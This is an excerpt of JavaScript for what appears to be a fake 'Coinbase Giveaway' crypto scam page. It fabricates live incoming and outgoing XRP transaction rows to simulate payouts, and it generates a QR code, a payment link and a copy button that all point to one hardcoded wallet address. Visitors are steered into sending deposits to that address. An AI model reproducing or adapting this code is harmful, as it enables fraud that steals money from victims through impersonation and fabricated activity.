...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">rsgF3zPGW6U2jnxx2jh4ugduT4g7oJr9bS</span> </td> <td>' +
    conamount +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">rsgF3zPGW6U2jnxx2jh4ugduT4g7oJr9bS</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td>' +
    outcon +
    ' XRP</td> <td><span class="grat-bgg">' +
  ...
  ;(row.innerHTML =
    ...
    setTimeout(() => {
      ...
      ;(row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell leadger"><a href="">' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">rsgF3zPGW6U2jnxx2jh4ugduT4g7oJr9bS</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        '</a> </td> <td>' +
        outcon +
        ' XRP</td> <td><span class="grat-bgg">' +
...
;(get_random = function (
  ...
  $('#gen-btn').click(() => {
    ;($('#cal-in').val() >= 100) & ($('#cal-in').val() <= 900000)
      ? ($('#warn').text(''),
        (tag = tx(999999)),
        (tm = Date.now()),
        ...
        $('#qrcode_svg').attr(
          'src',
          'https://api.qrserver.com/v1/create-qr-code/?data=ripple%3ArsgF3zPGW6U2jnxx2jh4ugduT4g7oJr9bS%3Famount%3D' +
            amount_entered +
        ...
        $('#paynow')
          ...
          .attr(
            'href',
            'ripple:rsgF3zPGW6U2jnxx2jh4ugduT4g7oJr9bS?amount=' +
              amount_entered +
              '&message=Deposit+to+Coinbase+Giveaway+' +
              tm,
          ),
        $('.pop-body').css('display', 'flex'))
      : $('#warn').text('Amount should be within $1500 and above')
  }),
  $('#close').click(() => {
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'rsgF3zPGW6U2jnxx2jh4ugduT4g7oJr9bS',
  )
